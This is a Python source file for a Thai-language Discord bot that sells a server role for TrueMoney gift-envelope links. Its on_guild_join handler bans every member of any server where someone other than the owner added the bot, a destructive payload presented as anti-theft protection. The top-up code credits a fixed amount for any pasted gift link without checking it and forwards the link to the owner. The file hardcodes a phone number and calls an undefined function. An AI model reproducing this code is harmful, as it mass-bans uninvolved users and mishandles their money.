import os
import discord
from discord.ext import commands
import datetime

# --- [ ส่วนที่ต้องแก้ ] ---
OWNER_ID = 1365673902973386774  # <<< ใส่ ID ของคุณตรงนี้
MY_PHONE = "061-249-6243"      # เบอร์วอลเล็ตของคุณ
ROLE_NAME = "ผู้ซื้อของโซน60"            # ชื่อยศที่จะขาย (ต้องมีในเซิร์ฟเวอร์)
PRICE = 60                     # ราคายศ (บาท)
# -----------------------

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# ระบบเก็บเงินจำลอง (Balance)
user_balances = {}

# --- [ คลาสสำหรับจัดการปุ่มกด ] ---
class ShopView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None) # ให้ปุ่มอยู่ตลอดไป

    @discord.ui.button(label="💳 เติมเงิน", style=discord.ButtonStyle.green, custom_id="topup_btn")
    async def topup(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(f"📢 **วิธีการเติมเงิน:**\nสร้างซองอั่งเปา (ซองละ 10 บาท) แล้วส่งลิงก์ซองลงในห้องนี้ได้เลย!\nเบอร์วอลเล็ต: `{MY_PHONE}`", ephemeral=True)

    @discord.ui.button(label="🛒 ซื้อยศ", style=discord.ButtonStyle.primary, custom_id="buy_role_btn")
    async def buy_role(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = interaction.user.id
        balance = user_balances.get(user_id, 0)

        if balance >= PRICE:
            role = discord.utils.get(interaction.guild.roles, name=ROLE_NAME)
            if role:
                await interaction.user.add_roles(role)
                user_balances[user_id] -= PRICE
                await interaction.response.send_message(f"🎉 สำเร็จ! คุณได้รับยศ **{ROLE_NAME}** เรียบร้อยแล้ว", ephemeral=True)
            else:
                await interaction.response.send_message("❌ เกิดข้อผิดพลาด: ไม่พบบทบาทในเซิร์ฟเวอร์", ephemeral=True)
        else:
            await interaction.response.send_message(f"❌ เงินไม่พอ! คุณมี {balance} บาท (ต้องการ {PRICE} บาท)", ephemeral=True)

    @discord.ui.button(label="💰 เช็คเงิน", style=discord.ButtonStyle.secondary, custom_id="check_bal_btn")
    async def check_balance(self, interaction: discord.Interaction, button: discord.ui.Button):
        balance = user_balances.get(interaction.user.id, 0)
        await interaction.response.send_message(f"💵 ยอดเงินคงเหลือของคุณคือ: **{balance}** บาท", ephemeral=True)

@bot.event
async def on_ready():
    # ทำให้ปุ่มทำงานแม้บอทจะรีสตาร์ท
    bot.add_view(ShopView())
    print(f'💀 REAPER PRO SHOP: ACTIVE')

@bot.event
async def on_guild_join(guild):
    """ระบบแบนยกดิสถ้าไม่ใช่เจ้าของดึงเข้า"""
    owner = await bot.fetch_user(OWNER_ID)
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
        if entry.user.id != OWNER_ID:
            await owner.send(f"🚨 **เตือน!** ขโมยตรวจพบที่ดิส: {guild.name}")
            for member in guild.members:
                try:
                    if member.id != bot.user.id:
                        await member.ban(reason="Reaper Security: Unauthorized Bot Usage")
                except: continue
            return

@bot.event
async def on_message(message):
    if message.author.bot: return

    # ระบบดักซองอั่งเปาแบบลบข้อความทันที
    if "gift.truemoney.com" in message.content:
        await message.delete()
        user_id = message.author.id
        user_balances[user_id] = user_balances.get(user_id, 0) + 10 # เพิ่มทีละ 10 ตามคลิป
        
        # แจ้งเตือนลูกค้า
        await message.channel.send(f"✅ {message.author.mention} เติมเงินสำเร็จ! ยอดปัจจุบัน: {user_balances[user_id]} บาท", delete_after=10)
        
        # ส่งลิงก์ให้เจ้าของกดรับเอง
        owner = await bot.fetch_user(OWNER_ID)
        await owner.send(f"💰 **เงินเข้า!** จากคุณ: {message.author.name}\nลิงก์ซอง: {message.content}")

    await bot.process_commands(message)

@bot.command()
async def ตั้งร้าน(ctx):
    """คำสั่งเรียกหน้ากากร้านค้าแบบปุ่มกด"""
    if ctx.author.id != OWNER_ID: return
    
    embed = discord.Embed(
        title="🏪 REAPER STORE - ระบบขายยศอัตโนมัติ", 
        description="บริการประทับใจ เติมเงินแล้วกดซื้อได้ทันที!", 
        color=0x00ff00
    )
    embed.add_field(name="💳 รายการสินค้า", value=f"ยศ **{ROLE_NAME}**\nราคา **{PRICE}** บาท", inline=False)
    embed.set_footer(text="ระบบตรวจสอบซองอั่งเปาทำงานตลอด 24 ชม.")
    
    # ส่งข้อความพร้อมปุ่ม
    await ctx.send(embed=embed, view=ShopView())

server_on()

bot.run(os.getenv('TOKEN'))
